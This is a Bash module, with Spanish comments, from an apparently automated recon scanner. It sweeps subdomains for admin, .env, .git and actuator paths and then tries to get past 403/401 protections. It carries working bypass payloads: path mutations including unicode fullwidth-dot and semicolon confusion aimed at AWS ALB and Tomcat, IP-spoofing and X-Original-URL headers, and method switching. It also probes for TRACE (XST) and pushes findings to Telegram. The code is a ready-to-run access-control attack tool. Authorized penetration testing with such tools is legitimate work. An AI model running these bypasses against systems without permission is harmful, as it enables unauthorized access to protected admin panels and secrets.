#!/usr/bin/env bash
# ============================================================
#  modules/23_403_bypass.sh
#  Fase 23: Bypass de respuestas 403/401
#
#  Técnicas:
#    - HTTP method switching (GET→POST→PUT→HEAD)
#    - Header injection (X-Original-URL, X-Rewrite-URL...)
#    - Path manipulation (/admin→/admin/→/./admin→/%2fadmin)
#    - Case manipulation (/Admin, /ADMIN)
#    - IP spoofing headers (X-Forwarded-For: 127.0.0.1)
#    - Protocol downgrade (https→http)
#    - ALB unicode bypass: fullwidth dots %ef%bc%8e%ef%bc%8e
#      (AWS ALB no normaliza unicode; Tomcat/Spring sí — bypassa WAF)
#    - ALB + Tomcat chain: unicode dots + semicolon path confusion
#
#  Referencias:
#    - HackTricks 403 bypass
#    - PayloadsAllTheThings HTTP bypass
#    - HackerOne top bypass reports
# ============================================================

MODULE_NAME="403_bypass"
MODULE_DESC="403/401 Bypass checker"

# ── Variaciones de path ───────────────────────────────────────
_path_variations() {
  local PATH_="$1"

  cat << VARIATIONS
${PATH_}
${PATH_}/
${PATH_}/.
/${PATH_}
//${PATH_}
/./${PATH_}
${PATH_}%20
${PATH_}%09
${PATH_}%00
${PATH_}/..;/
${PATH_}?
${PATH_}??
${PATH_}#
${PATH_}/*
${PATH_}..;
$(echo "$PATH_" | sed 's/\//\/%2f/')
$(echo "$PATH_" | sed 's/\//\/.\//g')
$(echo "$PATH_" | tr '[:lower:]' '[:upper:]')
$(echo "$PATH_" | sed 's/a/A/1')
/%ef%bc%8e%ef%bc%8e${PATH_}
/%ef%bc%8e%ef%bc%8e/..${PATH_}
/%ef%bc%8e%ef%bc%8e/..;${PATH_}
/..;/%ef%bc%8e%ef%bc%8e${PATH_}
VARIATIONS
}

# ── Headers de bypass ─────────────────────────────────────────
# declare -gA so it's visible from _test_403_bypass (a global function)
# when this module is sourced inside _run_module()
declare -gA BYPASS_HEADERS=(
  ["X-Original-URL"]="PATH"
  ["X-Rewrite-URL"]="PATH"
  ["X-Custom-IP-Authorization"]="127.0.0.1"
  ["X-Forwarded-For"]="127.0.0.1"
  ["X-Forwarded-For"]="localhost"
  ["X-Forwarded-For"]="0.0.0.0"
  ["X-Remote-IP"]="127.0.0.1"
  ["X-Client-IP"]="127.0.0.1"
  ["X-Host"]="127.0.0.1"
  ["X-Originating-IP"]="127.0.0.1"
  ["Forwarded"]="for=127.0.0.1"
  ["X-ProxyUser-Ip"]="127.0.0.1"
  ["True-Client-IP"]="127.0.0.1"
  ["Cluster-Client-IP"]="127.0.0.1"
  ["X-Real-IP"]="127.0.0.1"
)

# ── Test 403 bypass en una URL ────────────────────────────────
_test_403_bypass() {
  local URL="$1"
  local DOMAIN_ID="$2"
  local DOMAIN="$3"
  local PROXY_FLAG="$4"

  local BASE_HOST
  BASE_HOST=$(echo "$URL" | grep -oP 'https?://[^/]+')
  local PATH_
  PATH_=$(echo "$URL" | sed "s|${BASE_HOST}||")
  [[ -z "$PATH_" ]] && PATH_="/"

  # Obtener status original
  local ORIG_STATUS
  ORIG_STATUS=$(curl -sL -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
    -o /dev/null -w "%{http_code}" \
    ${PROXY_FLAG} "$URL" 2>/dev/null)

  # Solo interesa si es 403 o 401
  [[ "$ORIG_STATUS" != "403" && "$ORIG_STATUS" != "401" ]] && return 1

  log_info "  🔍 403 bypass: $URL (original: $ORIG_STATUS)"
  local BYPASSED=false

  # ── Técnica 1: variaciones de path ──────────────────────────
  while IFS= read -r VAR_PATH; do
    [[ -z "$VAR_PATH" || "$VAR_PATH" == "$PATH_" ]] && continue
    local VAR_URL="${BASE_HOST}${VAR_PATH}"
    local STATUS
    STATUS=$(curl -sL -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
      -o /dev/null -w "%{http_code}" \
      ${PROXY_FLAG} "$VAR_URL" 2>/dev/null)

    if [[ "$STATUS" == "200" || "$STATUS" == "301" || "$STATUS" == "302" ]]; then
      log_warn "  ⚡ 403 BYPASS (path): $VAR_URL → HTTP $STATUS"
      _report_bypass "$URL" "$VAR_URL" "path_variation" \
        "Path: $VAR_PATH → HTTP $STATUS" "$DOMAIN_ID" "$DOMAIN"
      BYPASSED=true
      break
    fi
  done < <(_path_variations "$PATH_")

  $BYPASSED && return 0

  # ── Técnica 2: headers de bypass ────────────────────────────
  for HEADER in "${!BYPASS_HEADERS[@]}"; do
    local VALUE="${BYPASS_HEADERS[$HEADER]}"
    [[ "$VALUE" == "PATH" ]] && VALUE="$PATH_"

    local STATUS
    STATUS=$(curl -sL -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
      -o /dev/null -w "%{http_code}" \
      -H "${HEADER}: ${VALUE}" \
      ${PROXY_FLAG} "$URL" 2>/dev/null)

    if [[ "$STATUS" == "200" ]]; then
      log_warn "  ⚡ 403 BYPASS (header): $HEADER: $VALUE → HTTP $STATUS"
      _report_bypass "$URL" "$URL" "header_bypass" \
        "Header: $HEADER: $VALUE → HTTP $STATUS" "$DOMAIN_ID" "$DOMAIN"
      BYPASSED=true
      break
    fi
  done

  $BYPASSED && return 0

  # ── Técnica 3: HTTP method switching ────────────────────────
  # TRACE excluido: devuelve 200 en cualquier path cuando está habilitado
  # (no es un bypass real — se detecta como XST en módulo 25/nuclei)
  for METHOD in POST PUT PATCH HEAD DELETE OPTIONS; do
    local STATUS BODY_LEN
    STATUS=$(curl -sL -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
      -o /dev/null -w "%{http_code}" \
      -X "$METHOD" \
      ${PROXY_FLAG} "$URL" 2>/dev/null)

    if [[ "$STATUS" == "200" || "$STATUS" == "201" ]]; then
      log_warn "  ⚡ 403 BYPASS (method): $METHOD $URL → HTTP $STATUS"
      _report_bypass "$URL" "$URL" "method_bypass" \
        "Method: $METHOD → HTTP $STATUS" "$DOMAIN_ID" "$DOMAIN"
      BYPASSED=true
      break
    fi
  done

  return $( $BYPASSED && echo 0 || echo 1 )
}

_report_bypass() {
  local ORIG_URL="$1" BYPASS_URL="$2" TYPE="$3"
  local DETAIL="$4" DOMAIN_ID="$5" DOMAIN="$6"

  local BEFORE
  BEFORE=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND target='${ORIG_URL//\'/\'\'}' AND type='403_bypass';" \
    2>/dev/null || echo "1")

  [[ "${BEFORE:-1}" != "0" ]] && return

  db_add_finding "$DOMAIN_ID" "403_bypass" "medium" \
    "$ORIG_URL" "$TYPE" "$DETAIL | Bypass: $BYPASS_URL"

  _telegram_send "🚪 *403 Bypass encontrado*
🌐 \`${DOMAIN}\`
🔗 Original: \`${ORIG_URL}\`
✅ Bypass: \`${BYPASS_URL}\`
🔧 Técnica: \`${TYPE}\`
💡 ${DETAIL}
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
}

module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 23 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  # Detect Cloudflare Bot Management: if root returns "Just a moment..." body,
  # all 403s will be CF challenges — bypass attempts are pointless.
  # Check two random paths; if both return same non-zero size, it's a uniform WAF.
  local ALIVE_FILE="$OUT_DIR/subs_alive.txt"
  local CF_BOT_PROTECTION=false
  if [[ -s "$ALIVE_FILE" ]]; then
    local _FIRST_SUB
    _FIRST_SUB=$(head -1 "$ALIVE_FILE" | tr -d '[:space:]')
    local _CF_BODY
    _CF_BODY=$(curl -s -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
      "https://${_FIRST_SUB}/" 2>/dev/null | head -c 1000)
    if echo "$_CF_BODY" | grep -qi "Just a moment\|cf-browser-verification\|cf_chl\|Checking your browser"; then
      log_info "Cloudflare Bot Management detectado — limitando bypass a técnicas anti-CF"
      CF_BOT_PROTECTION=true
    fi
  fi

  # ── Detección de TRACE habilitado (XST) ─────────────────────
  if [[ -s "$ALIVE_FILE" ]]; then
    local _TRACE_SUB
    _TRACE_SUB=$(head -1 "$ALIVE_FILE" | tr -d '[:space:]')
    local _TRACE_STATUS
    _TRACE_STATUS=$(curl -s -A "${SCAN_UA:-Mozilla/5.0}" --max-time 8 \
      -o /dev/null -w "%{http_code}" -X TRACE \
      ${CURL_PROXY} "https://${_TRACE_SUB}/" 2>/dev/null)
    if [[ "$_TRACE_STATUS" == "200" ]]; then
      log_warn "  ⚡ TRACE habilitado (XST): https://${_TRACE_SUB}/ → HTTP 200 — Cross-Site Tracing permite robo de headers HTTP-only"
      db_add_finding "$DOMAIN_ID" "xst" "medium" \
        "https://${_TRACE_SUB}/" "trace_enabled" \
        "TRACE method habilitado — Cross-Site Tracing (XST): un atacante puede leer headers HTTP (incluyendo cookies) via JS cross-origin"
      _telegram_send "🔍 *TRACE habilitado (XST)*
🌐 \`${DOMAIN}\`
🔗 \`https://${_TRACE_SUB}/\`
⚠️ HTTP TRACE activo — Cross-Site Tracing permite robo de headers/cookies
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
    fi
  fi

  # Primero hacer un sweep rápido para encontrar 403s
  local TARGETS_403="$OUT_DIR/.targets_403.txt"
  > "$TARGETS_403"

  # Paths conocidos de admin/panel que suelen dar 403
  local ADMIN_PATHS=(
    "/admin" "/administrator" "/admin/login" "/admin/dashboard"
    "/panel" "/cpanel" "/dashboard" "/management"
    "/api/admin" "/api/v1/admin" "/internal" "/private"
    "/config" "/setup" "/install" "/debug" "/console"
    "/actuator" "/actuator/env" "/actuator/beans"
    "/.env" "/.git" "/.git/config" "/web.config"
    "/server-status" "/nginx_status" "/phpinfo.php"
  )

  # Skip admin path sweep when Cloudflare Bot Management is active:
  # CF returns 403 for ALL paths uniformly, so the sweep adds noise without value.
  # Only proceed with paths actually discovered by the crawler (DB-sourced below).
  if $CF_BOT_PROTECTION; then
    log_info "Saltando sweep de paths admin (CF Bot Protection activo — todos devuelven 403)"
  fi

  # Testear paths admin en cada subdominio alive
  # Sin -L: capturar el status real (no el de destino del redirect)
  # 429 también interesante: rate limiting en ruta protegida
  if [[ ! "$CF_BOT_PROTECTION" == "true" && -s "$OUT_DIR/subs_alive.txt" ]]; then
    local SWEEP_PIDS=() SWEEP_TMP="$OUT_DIR/.sweep_tmp"
    mkdir -p "$SWEEP_TMP"
    while IFS= read -r SUB; do
      [[ -z "$SUB" ]] && continue
      (
        for APATH in "${ADMIN_PATHS[@]}"; do
          local TEST_URL="https://${SUB}${APATH}"
          local STATUS
          STATUS=$(curl -s -A "${SCAN_UA:-Mozilla/5.0}" --max-time 6 \
            -o /dev/null -w "%{http_code}" \
            ${CURL_PROXY} "$TEST_URL" 2>/dev/null)
          if [[ "$STATUS" == "403" || "$STATUS" == "401" || "$STATUS" == "429" ]]; then
            echo "$TEST_URL|$STATUS" >> "$SWEEP_TMP/${SUB//\//_}.txt"
          fi
        done
      ) &
      SWEEP_PIDS+=($!)
      if [[ ${#SWEEP_PIDS[@]} -ge 10 ]]; then
        wait "${SWEEP_PIDS[0]}" 2>/dev/null || true
        SWEEP_PIDS=("${SWEEP_PIDS[@]:1}")
      fi
    done < "$OUT_DIR/subs_alive.txt"
    wait "${SWEEP_PIDS[@]}" 2>/dev/null || true

    while IFS='|' read -r TURL TSTATUS; do
      [[ -z "$TURL" ]] && continue
      echo "$TURL" >> "$TARGETS_403"
      [[ "$TSTATUS" == "429" ]] && log_info "  🔒 Rate limited (429) en: $TURL"
    done < <(cat "$SWEEP_TMP"/*.txt 2>/dev/null)
    rm -rf "$SWEEP_TMP"
  fi

  # También URLs de la DB que ya dieron 403/401/429
  sqlite3 "$DB_PATH" \
    "SELECT url FROM urls
     WHERE domain_id=${DOMAIN_ID} AND status_code IN (403,401,429)
     LIMIT 50;" 2>/dev/null >> "$TARGETS_403"

  sort -u "$TARGETS_403" -o "$TARGETS_403"
  local TOTAL
  TOTAL=$(wc -l < "$TARGETS_403" | tr -d ' ')

  if [[ "$TOTAL" -eq 0 ]]; then
    log_ok "$MODULE_DESC completado: sin endpoints 403/401 para testear"
    rm -f "$TARGETS_403"
    return
  fi

  log_info "$TOTAL endpoints 403/401 encontrados — intentando bypass..."
  local BYPASSED=0

  while IFS= read -r URL; do
    [[ -z "$URL" ]] && continue
    http_should_skip "$URL" 2>/dev/null && continue
    _test_403_bypass "$URL" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY" && ((BYPASSED++))
  done < "$TARGETS_403"

  rm -f "$TARGETS_403"
  log_ok "$MODULE_DESC completado: $BYPASSED bypasses de $TOTAL endpoints 403/401"
}
